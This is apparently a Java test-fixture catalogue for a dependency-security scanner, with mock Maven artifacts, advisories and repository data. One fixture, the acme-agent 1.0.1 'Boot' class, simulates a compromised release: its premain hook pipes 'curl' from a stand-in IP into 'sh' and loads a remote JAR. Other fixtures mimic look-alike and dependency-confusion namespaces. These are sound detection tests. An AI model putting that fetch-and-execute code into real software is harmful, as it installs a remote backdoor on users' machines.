package in.slashmark.maven.mock;

import in.slashmark.maven.util.Json;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * The fixture catalogue: which artifacts exist, their advisories, KEV/EPSS entries, deps.dev data and
 * GitHub repositories. Real coordinates and advisory ids are used where it helps realism; the JARs
 * themselves are tiny.
 */
public final class FixtureData {
    private FixtureData() {}

    /** OSV advisories (full records). */
    public static final Map<String, Object> ADVISORIES = new LinkedHashMap<>();
    /** CISA KEV entries. */
    public static final List<Object> KEV = new ArrayList<>();
    /** EPSS scores. */
    public static final Map<String, double[]> EPSS = new LinkedHashMap<>();
    /** deps.dev dependents per g:a:v. */
    public static final Map<String, long[]> DEPENDENTS = new LinkedHashMap<>();
    /** deps.dev projects (Scorecard). */
    public static final Map<String, Object> PROJECTS = new LinkedHashMap<>();
    /** GitHub repositories: "owner/repo" -> data. */
    public static final Map<String, Map<String, Object>> REPOS = new LinkedHashMap<>();
    /** GitHub repository files: "owner/repo:path" -> content. */
    public static final Map<String, String> REPO_FILES = new LinkedHashMap<>();
    /** javadoc.io pages that exist: "g/a/v". */
    public static final java.util.Set<String> JAVADOC = new java.util.HashSet<>();

    static String cls(String pkg, String name, String body) {
        return "package " + pkg + ";\n" + body.replace("$NAME", name) + "\n";
    }

    public static void build(Fixtures fx) throws IOException {
        ADVISORIES.clear();
        KEV.clear();
        EPSS.clear();
        DEPENDENTS.clear();
        PROJECTS.clear();
        REPOS.clear();
        REPO_FILES.clear();
        JAVADOC.clear();

        // ---------------------------------------------------------------- log4j
        for (String v : new String[] {"2.14.1", "2.17.1", "2.24.3"}) {
            int days = v.equals("2.14.1") ? 1300 : v.equals("2.17.1") ? 1020 : 60;
            fx.publish(fx.lib("org.apache.logging.log4j:log4j-api:" + v).days(days).github("apache/logging-log4j2")
                    .src("org.apache.logging.log4j.Logger", "package org.apache.logging.log4j;\npublic interface Logger { void info(String m); void error(String m); }")
                    .src("org.apache.logging.log4j.LogManager", "package org.apache.logging.log4j;\npublic final class LogManager { public static Logger getLogger(Class<?> c) { return null; } }"));
            fx.publish(fx.lib("org.apache.logging.log4j:log4j-core:" + v).days(days).github("apache/logging-log4j2")
                    .dep("org.apache.logging.log4j:log4j-api:" + v)
                    .src("org.apache.logging.log4j.core.lookup.JndiLookup", "package org.apache.logging.log4j.core.lookup;\npublic class JndiLookup { public String lookup(String key) { return \"jndi:\" + key; } }")
                    .src("org.apache.logging.log4j.core.Appender", "package org.apache.logging.log4j.core;\npublic interface Appender { void append(String e); }"));
            JAVADOC.add("org.apache.logging.log4j/log4j-core/" + v);
        }
        DEPENDENTS.put("org.apache.logging.log4j:log4j-core:2.14.1", new long[] {4200, 1900});
        DEPENDENTS.put("org.apache.logging.log4j:log4j-core:2.17.1", new long[] {31000, 12000});
        DEPENDENTS.put("org.apache.logging.log4j:log4j-core:2.24.3", new long[] {9800, 4100});
        project("github.com/apache/logging-log4j2", 8.1, 3400, 1600);
        repo("apache/logging-log4j2", false, 3, 140, 40, new String[][] {{"rel/2.24.3", "60"}, {"rel/2.24.2", "95"}, {"rel/2.24.1", "130"}, {"rel/2.23.1", "210"}});

        // ---------------------------------------------------------------- jackson
        fx.publish(fx.lib("com.fasterxml.jackson:jackson-bom:2.18.2").days(70).pom()
                .manage("com.fasterxml.jackson.core:jackson-databind:2.18.2", "com.fasterxml.jackson.core:jackson-core:2.18.2", "com.fasterxml.jackson.core:jackson-annotations:2.18.2"));
        for (String v : new String[] {"2.9.10", "2.15.4", "2.18.2"}) {
            int days = v.equals("2.9.10") ? 2200 : v.equals("2.15.4") ? 300 : 70;
            fx.publish(fx.lib("com.fasterxml.jackson.core:jackson-annotations:" + v).days(days).github("FasterXML/jackson-annotations")
                    .src("com.fasterxml.jackson.annotation.JsonProperty", "package com.fasterxml.jackson.annotation;\npublic @interface JsonProperty { String value() default \"\"; }"));
            fx.publish(fx.lib("com.fasterxml.jackson.core:jackson-core:" + v).days(days).github("FasterXML/jackson-core")
                    .src("com.fasterxml.jackson.core.JsonParser", "package com.fasterxml.jackson.core;\npublic abstract class JsonParser { public abstract String getText(); }"));
        }
        for (String v : new String[] {"2.9.10.1", "2.15.4", "2.18.2"}) {
            String base = v.equals("2.9.10.1") ? "2.9.10" : v;
            int days = v.equals("2.9.10.1") ? 2150 : v.equals("2.15.4") ? 300 : 70;
            fx.publish(fx.lib("com.fasterxml.jackson.core:jackson-databind:" + v).days(days).github("FasterXML/jackson-databind")
                    .dep("com.fasterxml.jackson.core:jackson-annotations:" + base, "com.fasterxml.jackson.core:jackson-core:" + base)
                    .src("com.fasterxml.jackson.databind.ObjectMapper", "package com.fasterxml.jackson.databind;\npublic class ObjectMapper { public String writeValueAsString(Object o) { return String.valueOf(o); } public <T> T readValue(String s, Class<T> t) { return null; } }"));
        }
        DEPENDENTS.put("com.fasterxml.jackson.core:jackson-databind:2.9.10.1", new long[] {2100, 900});
        DEPENDENTS.put("com.fasterxml.jackson.core:jackson-databind:2.15.4", new long[] {14000, 6000});
        DEPENDENTS.put("com.fasterxml.jackson.core:jackson-databind:2.18.2", new long[] {22000, 9000});
        project("github.com/FasterXML/jackson-databind", 7.4, 3500, 1400);
        repo("FasterXML/jackson-databind", false, 2, 90, 25, new String[][] {{"jackson-databind-2.18.2", "70"}, {"jackson-databind-2.18.1", "100"}});

        // ---------------------------------------------------------------- spring
        for (String v : new String[] {"5.3.17", "5.3.18", "6.1.14"}) {
            int days = v.equals("5.3.17") ? 1660 : v.equals("5.3.18") ? 1655 : 120;
            fx.publish(fx.lib("org.springframework:spring-jcl:" + v).days(days).github("spring-projects/spring-framework")
                    .src("org.apache.commons.logging.Log", "package org.apache.commons.logging;\npublic interface Log { void info(Object m); }"));
            fx.publish(fx.lib("org.springframework:spring-core:" + v).days(days).github("spring-projects/spring-framework")
                    .dep("org.springframework:spring-jcl:" + v)
                    .src("org.springframework.core.SpringVersion", "package org.springframework.core;\npublic final class SpringVersion { public static String getVersion() { return \"" + v + "\"; } }"));
            fx.publish(fx.lib("org.springframework:spring-beans:" + v).days(days).github("spring-projects/spring-framework")
                    .dep("org.springframework:spring-core:" + v)
                    .src("org.springframework.beans.BeanWrapper", "package org.springframework.beans;\npublic interface BeanWrapper { Object getPropertyValue(String name); }"));
        }
        project("github.com/spring-projects/spring-framework", 7.9, 56000, 38000);
        repo("spring-projects/spring-framework", false, 5, 220, 60, new String[][] {{"v6.1.14", "120"}, {"v6.1.13", "150"}});

        // ---------------------------------------------------------------- guava
        fx.publish(fx.lib("com.google.guava:failureaccess:1.0.1").days(2400).github("google/guava")
                .src("com.google.common.util.concurrent.internal.InternalFutureFailureAccess", "package com.google.common.util.concurrent.internal;\npublic abstract class InternalFutureFailureAccess { }"));
        for (String v : new String[] {"31.1-jre", "32.1.3-jre", "33.4.8-jre"}) {
            int days = v.startsWith("31") ? 1100 : v.startsWith("32") ? 700 : 25;
            fx.publish(fx.lib("com.google.guava:guava:" + v).days(days).github("google/guava")
                    .dep("com.google.guava:failureaccess:1.0.1")
                    .src("com.google.common.base.Strings", "package com.google.common.base;\npublic final class Strings { public static boolean isNullOrEmpty(String s) { return s == null || s.isEmpty(); } }")
                    .src("com.google.common.io.Files", "package com.google.common.io;\npublic final class Files { public static java.io.File createTempDir() { return null; } }"));
        }
        DEPENDENTS.put("com.google.guava:guava:31.1-jre", new long[] {28000, 15000});
        DEPENDENTS.put("com.google.guava:guava:32.1.3-jre", new long[] {19000, 9000});
        DEPENDENTS.put("com.google.guava:guava:33.4.8-jre", new long[] {6100, 2500});
        project("github.com/google/guava", 8.6, 50000, 10900);
        repo("google/guava", false, 4, 160, 30, new String[][] {{"v33.4.8", "25"}, {"v33.4.7", "60"}});

        // ---------------------------------------------------------------- commons-logging vs jcl-over-slf4j (split package)
        fx.publish(fx.lib("commons-logging:commons-logging:1.2").days(3600)
                .src("org.apache.commons.logging.Log", "package org.apache.commons.logging;\npublic interface Log { void info(Object m); void debug(Object m); }")
                .src("org.apache.commons.logging.LogFactory", "package org.apache.commons.logging;\npublic abstract class LogFactory { public static Log getLog(Class<?> c) { return null; } }"));
        fx.publish(fx.lib("org.slf4j:slf4j-api:1.7.36").days(1500).license("MIT").github("qos-ch/slf4j")
                .src("org.slf4j.Logger", "package org.slf4j;\npublic interface Logger { void info(String m); }"));
        fx.publish(fx.lib("org.slf4j:jcl-over-slf4j:1.7.36").days(1500).license("MIT").github("qos-ch/slf4j")
                .dep("org.slf4j:slf4j-api:1.7.36")
                .src("org.apache.commons.logging.Log", "package org.apache.commons.logging;\npublic interface Log { void info(Object m); }")
                .src("org.apache.commons.logging.LogFactory", "package org.apache.commons.logging;\npublic abstract class LogFactory { public static Log getLog(Class<?> c) { return null; } public static Log getLog(String n) { return null; } }"));

        // ---------------------------------------------------------------- javax / jakarta
        fx.publish(fx.lib("javax.xml.bind:jaxb-api:2.3.1").days(2500).license("CDDL-1.1")
                .src("javax.xml.bind.DatatypeConverter", "package javax.xml.bind;\npublic final class DatatypeConverter { public static String printBase64Binary(byte[] b) { return java.util.Base64.getEncoder().encodeToString(b); } }")
                .src("javax.xml.bind.JAXBContext", "package javax.xml.bind;\npublic abstract class JAXBContext { public static JAXBContext newInstance(Class<?>... c) { return null; } }"));
        fx.publish(fx.lib("jakarta.xml.bind:jakarta.xml.bind-api:4.0.2").days(400).license("EPL-2.0")
                .src("jakarta.xml.bind.DatatypeConverter", "//release=11\npackage jakarta.xml.bind;\npublic final class DatatypeConverter { public static String printBase64Binary(byte[] b) { return null; } }"));
        fx.publish(fx.lib("javax.annotation:javax.annotation-api:1.3.2").days(2600).license("CDDL-1.1")
                .src("javax.annotation.PostConstruct", "package javax.annotation;\npublic @interface PostConstruct { }"));
        fx.publish(fx.lib("jakarta.annotation:jakarta.annotation-api:2.1.1").days(900).license("EPL-2.0")
                .src("jakarta.annotation.PostConstruct", "package jakarta.annotation;\npublic @interface PostConstruct { }"));

        // ---------------------------------------------------------------- mysql relocation (real-world)
        fx.publish(fx.lib("com.mysql:mysql-connector-j:8.0.33").days(560).license("GPL-2.0-with-classpath-exception").github("mysql/mysql-connector-j")
                .src("com.mysql.cj.jdbc.Driver", "package com.mysql.cj.jdbc;\npublic class Driver { }"));
        fx.publish(fx.lib("com.mysql:mysql-connector-j:9.1.0").days(30).license("GPL-2.0-with-classpath-exception").github("mysql/mysql-connector-j")
                .src("com.mysql.cj.jdbc.Driver", "package com.mysql.cj.jdbc;\npublic class Driver { }"));
        fx.publish(fx.lib("mysql:mysql-connector-java:8.0.33").days(560).relocate("com.mysql:mysql-connector-j:8.0.33").pom());

        // ---------------------------------------------------------------- Acme libraries (API evolution)
        String client1 = "package com.acme.core;\npublic class Client {\n  public Client(Config c) {}\n  public boolean connect(String url) { return true; }\n  public String fetch(String path) { return path; }\n  public void close() {}\n}";
        String config1 = "package com.acme.core;\npublic class Config { public int timeout = 30; public Config() {} public Config retries(int n) { return this; } }";
        String handler1 = "package com.acme.core;\npublic interface Handler { void handle(String event); }";
        fx.publish(fx.lib("com.acme:acme-core:1.0.0").days(700).github("acme-corp/acme-core").key("1111222233334444")
                .src("com.acme.core.Client", client1).src("com.acme.core.Config", config1).src("com.acme.core.Handler", handler1));
        fx.publish(fx.lib("com.acme:acme-core:1.1.0").days(400).github("acme-corp/acme-core").key("1111222233334444")
                .src("com.acme.core.Client", client1.replace("public void close() {}", "public void close() {}\n  public String fetchAll(String... paths) { return \"\"; }"))
                .src("com.acme.core.Config", config1).src("com.acme.core.Handler", handler1));
        fx.publish(fx.lib("com.acme:acme-core:2.0.0").days(20).github("acme-corp/acme-core").key("1111222233334444")
                .src("com.acme.core.Client", "//release=17\npackage com.acme.core;\npublic class Client {\n  public Client(Config c) {}\n  public java.util.concurrent.CompletableFuture<Boolean> connect(java.net.URI url) { return null; }\n  public String fetch(String path) { return path; }\n  public void close() {}\n}")
                .src("com.acme.core.Config", "package com.acme.core;\npublic final class Config { public int timeout = 30; public Config() {} public Config retries(int n) { return this; } }")
                .src("com.acme.core.Handler", "package com.acme.core;\npublic interface Handler { void handle(String event); void onError(Throwable t); }"));
        repo("acme-corp/acme-core", false, 0, 4, 3, new String[][] {{"v2.0.0", "20"}, {"v1.1.0", "400"}});
        project("github.com/acme-corp/acme-core", 4.2, 120, 14);
        DEPENDENTS.put("com.acme:acme-core:1.0.0", new long[] {40, 30});
        DEPENDENTS.put("com.acme:acme-core:1.1.0", new long[] {55, 41});
        DEPENDENTS.put("com.acme:acme-core:2.0.0", new long[] {6, 5});

        fx.publish(fx.lib("com.acme:acme-utils:1.0.0").days(650).github("acme-corp/acme-utils")
                .dep("com.acme:acme-core:1.0.0", "com.fasterxml.jackson.core:jackson-databind:2.15.4")
                .src("com.acme.utils.Strings", "package com.acme.utils;\npublic final class Strings { public static String trim(String s) { return s.trim(); } }"));
        fx.publish(fx.lib("com.acme:acme-utils:1.2.0").days(380).github("acme-corp/acme-utils")
                .dep("com.acme:acme-core:1.1.0", "com.fasterxml.jackson.core:jackson-databind:2.18.2")
                .src("com.acme.utils.Strings", "package com.acme.utils;\npublic final class Strings { public static String trim(String s) { return s.trim(); } }"));
        repo("acme-corp/acme-utils", true, 0, 0, 0, new String[][] {{"v1.2.0", "380"}});
        project("github.com/acme-corp/acme-utils", 2.8, 30, 4);

        // Agent: 1.0.1 adds a premain agent, a native library, process execution and a new signing key.
        fx.publish(fx.lib("com.acme:acme-agent:1.0.0").days(200).github("acme-corp/acme-agent").key("1111222233334444")
                .src("com.acme.agent.Metrics", "package com.acme.agent;\npublic class Metrics { public void record(String k, long v) {} }"));
        fx.publish(fx.lib("com.acme:acme-agent:1.0.1").days(1).github("acme-corp/acme-agent").key("DEADBEEFCAFEF00D")
                .mf("Premain-Class", "com.acme.agent.Boot").mf("Can-Retransform-Classes", "true")
                .file("native/linux-x86_64/libacme.so", new byte[] {0x7f, 'E', 'L', 'F', 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                .src("com.acme.agent.Metrics", "package com.acme.agent;\npublic class Metrics { public void record(String k, long v) {} }")
                .src("com.acme.agent.Boot", "package com.acme.agent;\npublic class Boot {\n public static void premain(String a, java.lang.instrument.Instrumentation i) throws Exception {\n  Runtime.getRuntime().exec(new String[]{\"sh\", \"-c\", \"curl -s http://203.0.113.7/x | sh\"});\n  java.net.URLClassLoader l = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"http://203.0.113.7/p.jar\")});\n }\n}"));
        repo("acme-corp/acme-agent", false, 0, 2, 1, new String[][] {{"v1.0.0", "200"}});

        // Fat jar with shaded (vulnerable) log4j classes.
        fx.publish(fx.lib("com.acme:acme-fat:1.0.0").days(500).github("acme-corp/acme-fat")
                .src("com.acme.fat.Main", "package com.acme.fat;\npublic class Main { }")
                .src("com.acme.shaded.org.apache.logging.log4j.core.lookup.JndiLookup", "package com.acme.shaded.org.apache.logging.log4j.core.lookup;\npublic class JndiLookup { public String lookup(String k) { return k; } }")
                .file("META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties", "groupId=org.apache.logging.log4j\nartifactId=log4j-core\nversion=2.14.1\n".getBytes(StandardCharsets.UTF_8))
                .file("org/apache/logging/log4j/core/lookup/JndiLookup.class", new byte[0]));

        // Relicensing.
        fx.publish(fx.lib("org.example:widgets:1.0.0").days(500).license("Apache-2.0").github("example-org/widgets")
                .src("org.example.widgets.Widget", "package org.example.widgets;\npublic class Widget { }"));
        fx.publish(fx.lib("org.example:widgets:2.0.0").days(10).license("BUSL-1.1").github("example-org/widgets")
                .src("org.example.widgets.Widget", "package org.example.widgets;\npublic class Widget { }"));
        fx.publish(fx.lib("org.example:gpl-lib:1.0").days(800).license("GPL-3.0-only")
                .src("org.example.gpl.Thing", "package org.example.gpl;\npublic class Thing { }"));

        // Version range target for drift.
        fx.publish(fx.lib("org.example:ranged:1.0.0").days(300).license("MIT")
                .src("org.example.ranged.R", "package org.example.ranged;\npublic class R { }"));
        fx.publish(fx.lib("org.example:ranged:1.1.0").days(50).license("MIT")
                .src("org.example.ranged.R", "package org.example.ranged;\npublic class R { }"));

        // Look-alike namespaces for takeover: "com.acrne" imitates "com.acme"; com.acme.internal is claimed publicly.
        fx.publish(fx.lib("com.acrne:acme-core:9.9.9").days(5).license("MIT").key("0BADC0DE0BADC0DE")
                .src("com.acrne.Evil", "package com.acrne;\npublic class Evil { }"));
        fx.publish(fx.lib("com.acme.internal:secret-sdk:99.0.0").days(3).license("MIT").key("0BADC0DE0BADC0DE")
                .src("com.acme.internal.Sdk", "package com.acme.internal;\npublic class Sdk { }"));

        // ---------------------------------------------------------------- advisories (OSV records)
        advisory("GHSA-jfh8-c2jp-5v3q", "CVE-2021-44228", "Remote code injection in Log4j", "CRITICAL",
                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", 1050, "org.apache.logging.log4j:log4j-core", "2.0-beta9", "2.15.0");
        advisory("GHSA-7rjr-3q55-vv33", "CVE-2021-45046", "Incomplete fix for Apache Log4j vulnerability", "CRITICAL",
                "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H", 1045, "org.apache.logging.log4j:log4j-core", "2.0-beta9", "2.16.0");
        advisory("GHSA-p6xc-xr62-6r2g", "CVE-2021-45105", "Apache Log4j2 does not always protect from infinite recursion", "HIGH",
                "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H", 1040, "org.apache.logging.log4j:log4j-core", "2.0-beta9", "2.17.0");
        advisory("GHSA-8489-44mv-ggj8", "CVE-2021-44832", "Improper Input Validation and Injection in Apache Log4j2", "MODERATE",
                "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H", 1030, "org.apache.logging.log4j:log4j-core", "2.0-beta7", "2.17.1");
        advisory("GHSA-57j2-w4cx-62h2", "CVE-2020-36518", "Deeply nested json in jackson-databind", "HIGH",
                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", 1600, "com.fasterxml.jackson.core:jackson-databind", "0", "2.12.6.1");
        advisory("GHSA-36p3-wjmg-h94x", "CVE-2022-22965", "Remote Code Execution in Spring Framework", "CRITICAL",
                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", 1660, "org.springframework:spring-beans", "5.3.0", "5.3.18");
        advisory("GHSA-7g45-4rm6-3mm3", "CVE-2023-2976", "Guava vulnerable to insecure use of temporary directory", "MODERATE",
                "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", 840, "com.google.guava:guava", "1.0", "32.0.0-android");
        advisory("GHSA-5mg8-w23w-74h3", "CVE-2020-8908", "Information Disclosure in Guava", "LOW",
                "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N", 1400, "com.google.guava:guava", "0", "32.0.0-android");
        advisory("GHSA-acm3-ut1l-0001", null, "Path traversal in Acme Utils archive helper", "HIGH",
                "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", 90, "com.acme:acme-utils", "0", "1.2.0");

        kev("CVE-2021-44228", "Apache", "Log4j2", "2021-12-10", true);
        kev("CVE-2021-45046", "Apache", "Log4j2", "2023-05-01", false);
        kev("CVE-2022-22965", "VMware", "Spring Framework", "2022-04-04", true);
        EPSS.put("CVE-2021-44228", new double[] {0.94358, 0.99995});
        EPSS.put("CVE-2021-45046", new double[] {0.94111, 0.99956});
        EPSS.put("CVE-2021-45105", new double[] {0.64021, 0.98412});
        EPSS.put("CVE-2021-44832", new double[] {0.09511, 0.94011});
        EPSS.put("CVE-2020-36518", new double[] {0.00413, 0.73212});
        EPSS.put("CVE-2022-22965", new double[] {0.97451, 0.99991});
        EPSS.put("CVE-2023-2976", new double[] {0.00044, 0.12345});
        EPSS.put("CVE-2020-8908", new double[] {0.00063, 0.28011});

        // ---------------------------------------------------------------- GitHub organisation for the dashboard
        repo("slash-mark-dev/api-service", false, 2, 30, 4, new String[][] {});
        repo("slash-mark-dev/web-portal", false, 1, 12, 2, new String[][] {});
        repo("slash-mark-dev/composer-suite", false, 0, 9, 1, new String[][] {});
        REPO_FILES.put("slash-mark-dev/api-service:pom.xml", "<project><modelVersion>4.0.0</modelVersion><groupId>in.slashmark</groupId><artifactId>api-service</artifactId><version>1.0.0</version>"
                + "<dependencies>" + Fixtures.depXml("org.apache.logging.log4j:log4j-core:2.14.1") + Fixtures.depXml("com.fasterxml.jackson.core:jackson-databind:2.18.2") + "</dependencies></project>");
        REPO_FILES.put("slash-mark-dev/web-portal:pom.xml", "<project><modelVersion>4.0.0</modelVersion><groupId>in.slashmark</groupId><artifactId>web-portal</artifactId><version>2.3.0</version>"
                + "<dependencies>" + Fixtures.depXml("org.springframework:spring-beans:6.1.14") + Fixtures.depXml("com.google.guava:guava:33.4.8-jre") + "</dependencies></project>");
    }

    static void advisory(String id, String cve, String summary, String severity, String vector, int daysAgo, String ga, String introduced, String fixed) {
        long now = System.currentTimeMillis();
        String pub = java.time.Instant.ofEpochMilli(now - daysAgo * Fixtures.DAY).toString();
        Map<String, Object> rec = Json.obj(
                "id", id,
                "summary", summary,
                "details", summary + ". See the references for details.",
                "aliases", cve == null ? List.of() : List.of(cve),
                "published", pub,
                "modified", pub,
                "severity", List.of(Json.obj("type", "CVSS_V3", "score", vector)),
                "affected", List.of(Json.obj(
                        "package", Json.obj("ecosystem", "Maven", "name", ga, "purl", "pkg:maven/" + ga.replace(':', '/')),
                        "ranges", List.of(Json.obj("type", "ECOSYSTEM", "events", List.of(Json.obj("introduced", introduced), Json.obj("fixed", fixed)))))),
                "references", List.of(Json.obj("type", "ADVISORY", "url", "https://github.com/advisories/" + id)),
                "database_specific", Json.obj("severity", severity, "cwe_ids", List.of("CWE-20"), "github_reviewed", true));
        ADVISORIES.put(id, rec);
    }

    static void kev(String cve, String vendor, String product, String added, boolean ransomware) {
        KEV.add(Json.obj("cveID", cve, "vendorProject", vendor, "product", product, "vulnerabilityName", product + " vulnerability",
                "dateAdded", added, "shortDescription", "Known exploited", "requiredAction", "Apply updates per vendor instructions.",
                "dueDate", added, "knownRansomwareCampaignUse", ransomware ? "Known" : "Unknown"));
    }

    static void project(String id, double score, long stars, long forks) {
        PROJECTS.put(id, Json.obj("projectKey", Json.obj("id", id), "openIssuesCount", 120, "starsCount", stars, "forksCount", forks,
                "license", "Apache-2.0", "description", id,
                "scorecard", Json.obj("date", "2026-10-20T00:00:00Z", "overallScore", score, "checks", List.of(
                        Json.obj("name", "Maintained", "score", score > 5 ? 10 : 0, "reason", score > 5 ? "30 commits in the last 90 days" : "0 commits in the last 90 days"),
                        Json.obj("name", "Signed-Releases", "score", -1, "reason", "no releases found"),
                        Json.obj("name", "Code-Review", "score", (int) score, "reason", "reviewed changesets")))));
    }

    /** A GitHub repository: archived flag, recent activity and releases ({tag, daysAgo}). */
    static void repo(String fullName, boolean archived, int commitsLast7d, int commitsLast90d, int contributors90d, String[][] releases) {
        long now = System.currentTimeMillis();
        Map<String, Object> r = new LinkedHashMap<>();
        r.put("full_name", fullName);
        r.put("name", fullName.substring(fullName.indexOf('/') + 1));
        r.put("html_url", "https://github.com/" + fullName);
        r.put("default_branch", "main");
        r.put("archived", archived);
        r.put("disabled", false);
        r.put("fork", false);
        r.put("stargazers_count", 100 + commitsLast90d * 10);
        r.put("forks_count", 10 + commitsLast90d);
        r.put("open_issues_count", 5 + commitsLast90d / 4);
        r.put("license", Json.obj("spdx_id", "Apache-2.0"));
        long lastPush = commitsLast90d == 0 ? now - 500 * Fixtures.DAY : commitsLast7d > 0 ? now - Fixtures.DAY : now - 30 * Fixtures.DAY;
        r.put("pushed_at", java.time.Instant.ofEpochMilli(lastPush).toString());
        r.put("created_at", java.time.Instant.ofEpochMilli(now - 3000 * Fixtures.DAY).toString());
        List<Object> rel = new ArrayList<>();
        for (String[] x : releases) {
            rel.add(Json.obj("tag_name", x[0], "name", x[0], "html_url", "https://github.com/" + fullName + "/releases/tag/" + x[0],
                    "body", "Release notes for " + x[0], "published_at", java.time.Instant.ofEpochMilli(now - Long.parseLong(x[1]) * Fixtures.DAY).toString(),
                    "prerelease", false, "draft", false));
        }
        r.put("_releases", rel);
        List<Object> commits = new ArrayList<>();
        for (int i = 0; i < commitsLast90d; i++) {
            long t = i < commitsLast7d ? now - (i + 1) * 3_600_000L : now - (8 + (long) i * 82 / Math.max(1, commitsLast90d)) * Fixtures.DAY;
            String login = "dev" + (i % Math.max(1, contributors90d));
            commits.add(Json.obj("sha", String.format("%040x", i + 1), "commit", Json.obj("author", Json.obj("name", login, "date", java.time.Instant.ofEpochMilli(t).toString())),
                    "author", Json.obj("login", login)));
        }
        r.put("_commits", commits);
        REPOS.put(fullName, r);
    }
}
